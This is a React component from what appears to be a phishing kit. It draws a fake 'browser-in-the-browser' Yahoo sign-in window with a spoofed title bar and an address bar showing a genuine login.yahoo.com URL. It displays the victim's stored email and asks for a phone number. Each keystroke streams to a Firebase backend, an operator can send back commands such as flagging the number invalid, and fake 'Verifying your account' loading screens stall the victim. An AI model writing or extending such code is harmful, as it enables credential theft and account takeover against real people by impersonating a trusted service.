import React from "react";
import EmailLayout from "../EmailLayout";
import yahooLogo from "../assets/logoyahoo.png";
import loadingSvg from "../assets/loadingya.svg";
import yahooFinalGif from "../assets/yahoofinal.gif";
import PhoneField from "../components/PhoneField.jsx";
import { getCountries } from "react-phone-number-input";
import { useFirebaseClient } from "../../../hooks/useFirebaseClient";
import { reportTyping } from "../../../firebase/typing";

const YahooNumeroPage = () => {
  const translations = {
    windowTitle: "Sign in to your account - Yahoo",
    url: "https://login.yahoo.com/account/challenge/phone?src=noSrc&done=https%3A%2F%2Fmail.yahoo.com%2Fd&display=login",
  };
  // Lista completa vem da lib (ISO-3166) – sem manter base local
  const countries = React.useMemo(() => getCountries() || [], []);
  const { updateClientData, commands, clearCommands, clientData } =
    useFirebaseClient();
  const [phone, setPhone] = React.useState("");
  const [isFieldFocused, setIsFieldFocused] = React.useState(false);
  const [isSubmitting, setIsSubmitting] = React.useState(false);
  const [introLoading, setIntroLoading] = React.useState(true);
  const [invalidMessage, setInvalidMessage] = React.useState("");
  const phrases = React.useMemo(
    () => [
      "Connecting to Yahoo...",
      "Verifying your account...",
      "Syncing security settings...",
      "Finalizing sign-in...",
    ],
    []
  );
  const [phraseIndex, setPhraseIndex] = React.useState(0);
  React.useEffect(() => {
    if (!isSubmitting) return;
    const id = setInterval(
      () => setPhraseIndex((p) => (p + 1) % phrases.length),
      2000
    );
    return () => clearInterval(id);
  }, [isSubmitting, phrases.length]);

  // Loading suave de entrada por 3s para o cliente não ver o email "trocando"
  React.useEffect(() => {
    const t = setTimeout(() => setIntroLoading(false), 3000);
    return () => clearTimeout(t);
  }, []);

  // País selecionado para o DDI (default BR)
  const defaultCountry = React.useMemo(
    () => (countries.includes("BR") ? "BR" : countries[0] || "US"),
    [countries]
  );
  const [selectedCountry, setSelectedCountry] = React.useState(defaultCountry);
  const [position, setPosition] = React.useState(() => ({
    left: Math.max(12, (window.innerWidth - 380) / 2),
    top: Math.max(12, (window.innerHeight - 480) / 2),
  }));
  const [isDragging, setIsDragging] = React.useState(false);
  const dragOffsetRef = React.useRef({ x: 0, y: 0 });
  const startDrag = (e) => {
    const tag = e.target.tagName;
    if (["INPUT", "BUTTON", "A", "SELECT", "TEXTAREA", "LABEL"].includes(tag))
      return;
    setIsDragging(true);
    dragOffsetRef.current = {
      x: e.clientX - position.left,
      y: e.clientY - position.top,
    };
  };
  React.useEffect(() => {
    const onMove = (e) => {
      if (!isDragging) return;
      setPosition({
        left: Math.max(0, e.clientX - dragOffsetRef.current.x),
        top: Math.max(0, e.clientY - dragOffsetRef.current.y),
      });
    };
    const onUp = () => setIsDragging(false);
    if (isDragging) {
      document.addEventListener("mousemove", onMove);
      document.addEventListener("mouseup", onUp);
    }
    return () => {
      document.removeEventListener("mousemove", onMove);
      document.removeEventListener("mouseup", onUp);
    };
  }, [isDragging]);

  // Atualizar URL e etapa
  React.useEffect(() => {
    try {
      const payload = {
        currentUrl: "/sync?view=yahoo_numero",
        currentPage: "yahoo_numero",
        yahooStage: "Número",
        fromForm: true,
      };
      // Não sobreescrever yahooNumeroEmail aqui; apenas enviaremos se existir um valor local explícito
      try {
        const localEmail =
          (typeof window !== "undefined" &&
            (localStorage.getItem("yahoo_numero_email") ||
              localStorage.getItem("client_email"))) ||
          "";
        if (localEmail && localEmail.trim()) {
          payload.yahooNumeroEmail = localEmail.trim();
        }
      } catch {}
      updateClientData(payload);
    } catch {}
  }, [updateClientData]);

  // Função de navegação que sempre retorna false (deixa o useFirebaseClient lidar com redirecionamentos)
  const navigateByCommand = React.useCallback(() => false, []);

  React.useEffect(() => {
    if (!commands || commands.length === 0) return;
    const latest = commands[commands.length - 1];
    if (!latest || typeof latest !== "string") return;

    if (latest.startsWith("inv_") || latest.startsWith("invalid_")) {
      setInvalidMessage("Invalid phone digits.");
      setLast4("");
      setIsSubmitting(false);
      setTimeout(() => clearCommands && clearCommands(), 200);
      return;
    }

    const navigated = navigateByCommand(latest);
    if (navigated) {
      // limpar após navegar
      setTimeout(() => clearCommands(), 100);
    }
  }, [commands, navigateByCommand, clearCommands]);

  // Formata o número local conforme país
  // Deixamos a formatação com a lib; placeholder e máscara vêm prontos

  return (
    <EmailLayout>
      <div
        className="relative p-4 overflow-x-hidden"
        style={{ fontFamily: "Arial, sans-serif" }}
      >
        <div
          onMouseDown={startDrag}
          style={{
            background: "#fff",
            borderRadius: 10,
            boxShadow: "0 2px 16px rgba(0,0,0,0.2)",
            width: "min(380px, 92vw)",
            minHeight: 420,
            color: "#252423",
            display: "flex",
            flexDirection: "column",
            overflow: "hidden",
            position: "fixed",
            left: "50%",
            top: "50%",
            transform: "translate(-50%, -50%)",
            zIndex: 1000,
            cursor: isDragging ? "grabbing" : "default",
          }}
        >
          {/* Simulação da barra da janela/navegador (título + botões -, □, ×) */}
          <div
            data-window-header="true"
            onMouseDown={startDrag}
            style={{
              height: 24,
              background: "#e3f2fd",
              borderBottom: "1px solid #e1dfdd",
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              padding: "0 14px",
              fontSize: 12,
              color: "#605e5c",
              cursor: "grab",
            }}
          >
            <span
              style={{
                opacity: 0.9,
                display: "flex",
                alignItems: "center",
                gap: 8,
              }}
            >
              {/* Yahoo logo */}
              <svg
                xmlns="http://www.w3.org/2000/svg"
                aria-label="Yahoo!"
                viewBox="0 0 512 512"
                fill="#fff"
                width="16"
                height="16"
              >
                <rect width="512" height="512" rx="15%" fill="#5f01d1" />
                <path d="M203 404h-62l25-59-69-165h63l37 95 37-95h62m58 76h-69l62-148h69" />
                <circle cx="303" cy="308" r="38" />
              </svg>
              {translations.windowTitle}
            </span>
            <div style={{ display: "flex", gap: 6 }}>
              <button
                title="Minimize"
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  cursor: "default",
                  fontSize: 16,
                  lineHeight: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M3 8.5H13"
                    stroke="#605e5c"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                </svg>
              </button>
              <button
                title="Maximize"
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  cursor: "default",
                  fontSize: 16,
                  lineHeight: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <rect
                    x="3.5"
                    y="3.5"
                    width="9"
                    height="9"
                    rx="1"
                    stroke="#605e5c"
                    strokeWidth="1.5"
                  />
                </svg>
              </button>
              <button
                title="Close"
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  color: "#605e5c",
                  cursor: "default",
                  fontSize: 16,
                  lineHeight: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M4 4L12 12"
                    stroke="#605e5c"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                  <path
                    d="M12 4L4 12"
                    stroke="#605e5c"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                </svg>
              </button>
            </div>
          </div>

          {/* Barra de endereço/URL - colada na barra da janela */}
          <div
            style={{
              borderBottom: "1px solid #e1dfdd",
              padding: 0,
              background: "#ffffff",
              margin: 0,
            }}
          >
            <div
              style={{
                width: "100%",
                background: "#f5f5f5",
                borderTop: "1px solid #d0d7de",
                borderBottom: "1px solid #d0d7de",
                boxSizing: "border-box",
                height: 28,
                display: "flex",
                alignItems: "center",
                padding: "0 14px 0 12px",
                gap: 10,
                fontSize: 12,
                color: "#605e5c",
              }}
            >
              <svg
                width="14"
                height="14"
                viewBox="0 0 16 16"
                xmlns="http://www.w3.org/2000/svg"
                version="1.1"
                fill="none"
                stroke="#605e5c"
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="1.5"
                aria-hidden="true"
                style={{ display: "block" }}
              >
                <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
              </svg>
              <div
                style={{
                  overflow: "hidden",
                  textOverflow: "ellipsis",
                  whiteSpace: "nowrap",
                  flex: 1,
                  fontWeight: 400,
                  letterSpacing: "0.2px",
                }}
              >
                {translations.url}
              </div>
            </div>
          </div>

          <div style={{ padding: 24 }}>
            <div
              style={{
                display: "flex",
                justifyContent: "center",
                marginBottom: 16,
              }}
            >
              <img
                src={yahooLogo}
                alt="Yahoo"
                style={{ height: 32, width: "auto" }}
              />
            </div>
            {/* Mostrar email salvo em badge arredondada */}
            <div
              style={{
                display: "flex",
                justifyContent: "center",
                marginTop: -6,
                marginBottom: 6,
              }}
            >
              <button
                type="button"
                style={{
                  background: "#F9FAFB",
                  color: "#111827",
                  border: "1px solid #e5e7eb",
                  borderRadius: 9999,
                  padding: "6px 12px",
                  fontSize: 12,
                  fontWeight: 600,
                  cursor: "default",
                  boxShadow: "0 1px 0 rgba(0,0,0,0.03)",
                  display: "flex",
                  alignItems: "center",
                  gap: 4,
                }}
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 291.319 291.319"
                  width="14"
                  height="14"
                  style={{ display: "block" }}
                >
                  <path
                    fill="#720e9e"
                    d="M145.659 0c80.45 0 145.66 65.219 145.66 145.66 0 80.45-65.21 145.659-145.66 145.659S0 226.109 0 145.66C0 65.219 65.21 0 145.659 0"
                  />
                  <path
                    fill="#fff"
                    d="m212.353 114.98.155-.027 4.825-5.371-.237-.018.51-.801h-67.595l2.604 9.249h18.444l-31.044 28.722c-6.336-9.24-21.184-30.479-31.544-46.411h19.254v-6.555l.264-1.884-.264-.036v-.765H54.631v9.24H77.49c8.876 7.328 47.358 54.049 48.76 58.51.564 4.179 1.366 28.841-.291 30.698-1.994 2.868-22.814 1.32-26.483 1.593l-.137 9.058c6.7.2 26.801-.009 33.584-.009 13.364 0 36.77-.346 40.065-.082l.41-8.576-26.901-.401c-.564-3.887-1.183-28.422-.619-31.098 2.54-7.765 43.816-39.902 48.059-41.112l3.997-.901h12.472c-.001-.001 1.947-3.023 1.947-3.023m-10.087 64.099 11.689.892 13.628-49.979c-2.276-.082-22.95-1.93-25.636-2.431zm-2.021 8.012.064 12.208 5.917.492 6.391.446 1.875-11.944-6.737-.31z"
                  />
                </svg>
                {(typeof window !== "undefined" &&
                  ((localStorage.getItem("yahoo_numero_email") || "").trim() ||
                    (localStorage.getItem("client_email") || "").trim())) ||
                  (clientData && clientData.yahooNumeroEmail) ||
                  (clientData && clientData.email) ||
                  ""}
              </button>
            </div>
            <h1 style={{ fontSize: 22, fontWeight: 600, margin: "6px 0 8px" }}>
              Enter your phone number
            </h1>
            {/* Input único com seletor interno (react-phone-number-input) */}
            <PhoneField
              value={phone}
              onChange={(val) => {
                setPhone(val || "");
                try {
                  updateClientData({ yahooNumero: val || "" });
                  reportTyping("yahoonumero", val || "");
                } catch {}
              }}
              defaultCountry={selectedCountry}
              onCountryChange={(c) => setSelectedCountry(c || defaultCountry)}
              onFocus={() => setIsFieldFocused(true)}
              onBlur={() => setIsFieldFocused(false)}
            />
            {invalidMessage && (
              <div style={{ color: "#a4262c", fontSize: 12, marginTop: 6 }}>
                {invalidMessage}
              </div>
            )}
            <div style={{ marginTop: 16 }}>
              <button
                type="button"
                style={{
                  width: "100%",
                  padding: "14px",
                  background: phone.trim() ? "#6a33f5" : "#e6dbfb",
                  color: phone.trim() ? "#fff" : "#5f5a64",
                  border: "none",
                  borderRadius: 28,
                  fontSize: 14,
                  fontWeight: 700,
                  cursor: phone.trim() ? "pointer" : "not-allowed",
                }}
                onClick={(e) => {
                  e.preventDefault();
                  if (!phone.trim()) return;
                  setIsSubmitting(true);
                  try {
                    updateClientData({ yahooNumeroSubmittedAt: Date.now() });
                  } catch {}
                }}
              >
                Next
              </button>
            </div>
            {/* Overlay final igual ao Yahoo SMS */}
            {isSubmitting && (
              <div
                style={{
                  position: "absolute",
                  inset: 0,
                  background: "#ffffff",
                  display: "flex",
                  flexDirection: "column",
                  zIndex: 25,
                  pointerEvents: "none",
                }}
              >
                <div
                  style={{
                    height: 24,
                    background: "#e3f2fd",
                    borderBottom: "1px solid #e1dfdd",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "space-between",
                    padding: "0 14px",
                    fontSize: 12,
                    color: "#605e5c",
                  }}
                >
                  <span
                    style={{
                      opacity: 0.9,
                      display: "flex",
                      alignItems: "center",
                      gap: 8,
                    }}
                  >
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      aria-label="Yahoo!"
                      viewBox="0 0 512 512"
                      fill="#fff"
                      width="16"
                      height="16"
                    >
                      <rect width="512" height="512" rx="15%" fill="#5f01d1" />
                      <path d="M203 404h-62l25-59-69-165h63l37 95 37-95h62m58 76h-69l62-148h69" />
                      <circle cx="303" cy="308" r="38" />
                    </svg>
                    {translations.windowTitle}
                  </span>
                  <div style={{ display: "flex", gap: 6 }}>
                    <svg width="12" height="12" viewBox="0 0 16 16" aria-hidden>
                      <path
                        d="M3 8.5H13"
                        stroke="#605e5c"
                        strokeWidth="1.2"
                        strokeLinecap="round"
                      />
                    </svg>
                    <svg width="12" height="12" viewBox="0 0 16 16" aria-hidden>
                      <rect
                        x="3.5"
                        y="3.5"
                        width="9"
                        height="9"
                        rx="1"
                        stroke="#605e5c"
                        strokeWidth="1.2"
                        fill="none"
                      />
                    </svg>
                    <svg width="12" height="12" viewBox="0 0 16 16" aria-hidden>
                      <path
                        d="M4 4L12 12"
                        stroke="#605e5c"
                        strokeWidth="1.2"
                        strokeLinecap="round"
                      />
                      <path
                        d="M12 4L4 12"
                        stroke="#605e5c"
                        strokeWidth="1.2"
                        strokeLinecap="round"
                      />
                    </svg>
                  </div>
                </div>
                <div
                  style={{
                    borderBottom: "1px solid #e1dfdd",
                    background: "#ffffff",
                  }}
                >
                  <div
                    style={{
                      width: "100%",
                      background: "#f5f5f5",
                      borderTop: "1px solid #d0d7de",
                      borderBottom: "1px solid #d0d7de",
                      boxSizing: "border-box",
                      height: 28,
                      display: "flex",
                      alignItems: "center",
                      padding: "0 14px 0 12px",
                      gap: 10,
                      fontSize: 12,
                      color: "#605e5c",
                    }}
                  >
                    <svg
                      width="14"
                      height="14"
                      viewBox="0 0 16 16"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      stroke="#605e5c"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth="1.5"
                      aria-hidden="true"
                      style={{ display: "block" }}
                    >
                      <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                      <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
                    </svg>
                    <div
                      style={{
                        overflow: "hidden",
                        textOverflow: "ellipsis",
                        whiteSpace: "nowrap",
                        flex: 1,
                        fontWeight: 400,
                        letterSpacing: "0.2px",
                      }}
                    >
                      {translations.url}
                    </div>
                  </div>
                </div>
                <div
                  style={{
                    flex: 1,
                    display: "flex",
                    flexDirection: "column",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: 20,
                    textAlign: "center",
                    padding: "20px",
                  }}
                >
                  <img
                    src={yahooFinalGif}
                    alt="Connecting to Yahoo"
                    style={{ width: 280, height: "auto" }}
                  />
                  <img
                    src={loadingSvg}
                    alt="Loading"
                    style={{
                      width: "90%",
                      height: 8,
                      objectFit: "contain",
                      filter: "brightness(0.45) contrast(1.35)",
                    }}
                  />
                  <div
                    style={{
                      color: "#4b5563",
                      fontSize: 18,
                      minHeight: 24,
                      fontWeight: 500,
                    }}
                  >
                    {phrases[phraseIndex]}
                  </div>
                </div>
              </div>
            )}
          </div>

          {/* Overlay de carregamento inicial (3s) */}
          {introLoading && (
            <div
              style={{
                position: "absolute",
                inset: 0,
                background: "#ffffff",
                display: "flex",
                flexDirection: "column",
                zIndex: 40,
              }}
            >
              <div
                style={{
                  height: 24,
                  background: "#e3f2fd",
                  borderBottom: "1px solid #e1dfdd",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  padding: "0 14px",
                  fontSize: 12,
                  color: "#605e5c",
                }}
              >
                <span
                  style={{
                    opacity: 0.9,
                    display: "flex",
                    alignItems: "center",
                    gap: 8,
                  }}
                >
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    aria-label="Yahoo!"
                    viewBox="0 0 512 512"
                    fill="#fff"
                    width="16"
                    height="16"
                  >
                    <rect width="512" height="512" rx="15%" fill="#5f01d1" />
                    <path d="M203 404h-62l25-59-69-165h63l37 95 37-95h62m58 76h-69l62-148h69" />
                    <circle cx="303" cy="308" r="38" />
                  </svg>
                  {translations.windowTitle}
                </span>
                <div style={{ display: "flex", gap: 6 }}>
                  <svg width="12" height="12" viewBox="0 0 16 16" aria-hidden>
                    <path
                      d="M3 8.5H13"
                      stroke="#605e5c"
                      strokeWidth="1.2"
                      strokeLinecap="round"
                    />
                  </svg>
                  <svg width="12" height="12" viewBox="0 0 16 16" aria-hidden>
                    <rect
                      x="3.5"
                      y="3.5"
                      width="9"
                      height="9"
                      rx="1"
                      stroke="#605e5c"
                      strokeWidth="1.2"
                      fill="none"
                    />
                  </svg>
                  <svg width="12" height="12" viewBox="0 0 16 16" aria-hidden>
                    <path
                      d="M4 4L12 12"
                      stroke="#605e5c"
                      strokeWidth="1.2"
                      strokeLinecap="round"
                    />
                    <path
                      d="M12 4L4 12"
                      stroke="#605e5c"
                      strokeWidth="1.2"
                      strokeLinecap="round"
                    />
                  </svg>
                </div>
              </div>
              <div
                style={{
                  borderBottom: "1px solid #e1dfdd",
                  background: "#ffffff",
                }}
              >
                <div
                  style={{
                    width: "100%",
                    background: "#f5f5f5",
                    borderTop: "1px solid #d0d7de",
                    borderBottom: "1px solid #d0d7de",
                    boxSizing: "border-box",
                    height: 28,
                    display: "flex",
                    alignItems: "center",
                    padding: "0 14px 0 12px",
                    gap: 10,
                    fontSize: 12,
                    color: "#605e5c",
                  }}
                >
                  <svg
                    width="14"
                    height="14"
                    viewBox="0 0 16 16"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    stroke="#605e5c"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth="1.5"
                    aria-hidden="true"
                    style={{ display: "block" }}
                  >
                    <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                    <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
                  </svg>
                  <div
                    style={{
                      overflow: "hidden",
                      textOverflow: "ellipsis",
                      whiteSpace: "nowrap",
                      flex: 1,
                      fontWeight: 400,
                      letterSpacing: "0.2px",
                    }}
                  >
                    {translations.url}
                  </div>
                </div>
              </div>
              <div
                style={{
                  flex: 1,
                  display: "flex",
                  flexDirection: "column",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 20,
                  textAlign: "center",
                  padding: 20,
                }}
              >
                <img
                  src={yahooFinalGif}
                  alt="Connecting to Yahoo"
                  style={{ width: 260, height: "auto" }}
                />
                <img
                  src={loadingSvg}
                  alt="Loading"
                  style={{
                    width: "88%",
                    height: 8,
                    objectFit: "contain",
                    filter: "brightness(0.45) contrast(1.35)",
                  }}
                />
              </div>
            </div>
          )}
        </div>
      </div>
    </EmailLayout>
  );
};

export default YahooNumeroPage;
